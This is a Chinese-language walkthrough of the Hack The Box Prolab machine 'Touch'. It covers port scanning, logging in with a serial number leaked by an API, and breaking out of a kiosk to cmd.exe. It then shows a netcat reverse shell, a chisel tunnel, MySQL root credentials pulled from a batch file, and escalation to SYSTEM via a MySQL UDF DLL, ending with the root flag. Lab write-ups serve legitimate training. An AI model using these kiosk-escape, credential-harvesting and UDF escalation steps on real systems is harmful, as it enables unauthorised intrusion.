---
title: Touch
date: 2026-10-26 13:28:04
categories:
  - prolabs
tags:
  - HTB
  - Prolab
  - Touch
  - 内网渗透
---
# Touch

![image-20261026085604852](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026085612040.png)

## 信息收集

```bash
                     
┌──(root㉿kali)-[~/htb/Touch]
└─# nmap -Pn -sV 10.129.61.194 --min-rate 2000         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 21:00 -0400
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for touch.htb (10.129.61.194)
Host is up (1.3s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

开放135 3389 5985 8443端口

给了初始凭据

```
Jenny Crawford / KS7X2M
```

先进行认证

```
xfreerdp /v:10.129.61.194 /u:"Jenny Crawford" /p:"KS7X2M" /cert:ignore -sec:rdp
```

看看能否远程rdp连接

![image-20261026091342030](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026091342267.png)

看来不能远程rdp 看来失败了

看看能不能winrm

```bash
                 
┌──(root㉿kali)-[~/htb/Touch]
└─# nxc winrm 10.129.61.194 -u "Jenny Crawford" -p "KS7X2M" --verbose
[21:17:37] INFO     Socket info: host=10.129.61.194, hostname=10.129.61.194, kerberos=False, ipv6=False, link-local ipv6=False                                 connection.py:174
WINRM       10.129.61.194   5985   KIOSK-042        [*] Windows 11 / Server 2025 Build 26100 (name:KIOSK-042) (domain:KIOSK-042) 
WINRM       10.129.61.194   5985   KIOSK-042        [-] KIOSK-042\Jenny Crawford:KS7X2M
                
```

也失败

转战web页面

8443端口是个前端登录页面

![image-20261026091544961](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026091545039.png)

```sh
──(root㉿kali)-[~/htb/Touch]
└─# whatweb http://10.129.61.194:8443/  
http://10.129.61.194:8443/ [302 Found] Access-Control-Allow-Methods[GET, POST, PUT, OPTIONS], Country[RESERVED][ZZ], HTTPServer[Microsoft-HTTPAPI/2.0], IP[10.129.61.194], Microsoft-HTTPAPI[2.0], RedirectLocation[/login], UncommonHeaders[access-control-allow-origin,access-control-allow-methods,access-control-allow-headers]
http://10.129.61.194:8443/login [200 OK] Access-Control-Allow-Methods[GET, POST, PUT, OPTIONS], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-HTTPAPI/2.0], IP[10.129.61.194], Microsoft-HTTPAPI[2.0], PasswordField[password], Script, Title[Nexion DeviceHub - Login], UncommonHeaders[access-control-allow-origin,access-control-allow-methods,access-control-allow-headers]

```

通过目录探测，发现存在/api/status

```
┌──(root㉿kali)-[~/htb/Touch]
└─# curl -i http://10.129.61.194:8443/api/status
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Type: application/json
Server: Microsoft-HTTPAPI/2.0
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: Content-Type
Date: Mon, 26 Oct 2026 08:27:37 GMT

{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":30457}                                           
```

拿到了序列号 `NX-DH-2024-B7042`，这正是登录页提示的默认密码。直接用它登录 `/login`

成功登录

![image-20261026093404464](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026093404586.png)

成功登录，并且发现了一组凭据

```
nxc winrm 10.129.61.194 -u 'KioskUser' -p 'K!0sk2026#'
```

但是winrm连接失败

```
xfreerdp /v:10.129.61.194 /u:'KioskUser' /p:'K!0sk2026#' /cert:ignore /sec:rdp
```

但是rdp连接成功

![image-20261026094034389](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026094034493.png)

先把这个关了

![image-20261026100535182](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026100535328.png)

远程rdp中点击右下角的「STAFF LOGIN」按钮. Agent 想拿staff 权限

点击发出错误弹窗

![image-20261026100707486](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026100707554.png)

现在，**直接点击那个蓝色的超链接**：`https://support.nexionsystems.com/docreader/troubleshoot`。

点击后，系统应该会调用默认浏览器（通常是 Microsoft Edge 或 Internet Explorer）打开这个网页。一旦浏览器打开，逃逸就成功了

在浏览器中按下键盘快捷键 **`Ctrl + S`**。这会弹出一个“另存为”窗口。在“文件名”那一栏里，输入 `cmd.exe` 并回车

![image-20261026101400345](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026101400420.png)

拿下user.txt

![image-20261026101915589](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026101915664.png)

上传nc 反弹shell到kali上

![image-20261026104932812](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026104932868.png)

查找数据库文件

## 提权

```
C:\Program Files\HTB Airways\Kiosk>type packages\backend\src\database\index.ts
```

![image-20261026105350467](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026105350565.png)

- **用户名**：`kiosk_app`
- **密码**：`K!0sk_R3pl1ca#DB`

在

```
C:\Program Files\HTB Airways\Kiosk>type "C:\ProgramData\HTB Airways\db-config.ini"
type C:\ProgramData\pwned.txttype "C:\ProgramData\HTB Airways\db-config.ini"
Access is denied.

C:\Program Files\HTB Airways\Kiosk>
type C:\ProgramData\pwned.txt
SYSTEM: DESKTOP-TH78LPV$
C:\Program Files\HTB Airways\Kiosk>

```

`pwned.txt` 里的 `SYSTEM: DESKTOP-TH78LPV$` 证明提权的最终目标确实是 SYSTEM 权限

用chisel建立隧道，连接数据库

![image-20261026110439513](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026110439599.png)

密码 `K!0sk_R3pl1ca#DB`

但是没有权限最终

```

C:\ProgramData\HTB Airways>type refresh-dates.bat
type refresh-dates.bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul

C:\ProgramData\HTB Airways>

```

找到root的账号密码HTB@irw4ys_DB!2026

```

└─# mysql -u root -p -h 127.0.0.1 -P 13306
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 15
Server version: 8.0.42 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 

```

查看特权

![image-20261026113858959](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026113859066.png)

最后

提权

准备恶意 DLL

MySQL 允许用户通过加载外部动态链接库（`.dll`）来扩展功能。我们在 Kali 里使用了 Metasploit 自带的 `lib_mysqludf_sys_64.dll`。这个 DLL 里打包了可以直接调用 Windows 系统命令的函数（如 `sys_eval`、`sys_exec`）。

![image-20261026114756247](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026114756284.png)

上传 DLL 到插件目录

因为 MySQL 强制要求加载的 DLL 必须放在它的专属插件目录里，所以我们先通过之前拿到的 `KioskUser` 的反弹 Shell，用 `curl` 把 DLL 下载到了 `C:\MySQL\lib\plugin\`。

![image-20261026114913520](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026114913558.png)

创建自定义函数（关键的一步）

我们通过 Kali 连上 MySQL，执行了那条报错的语句：

sql

```
create function sys_eval returns string soname 'C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll';
```

![image-20261026115005058](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026115005116.png)

![image-20261026114458481](https://gitee.com/crx12345/my-image-host/raw/master/images/20261026114458515.png)

```
system

C:\MySQL\data>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
ad652f15f8e667a94011a6fedec04879

C:\MySQL\data>

```

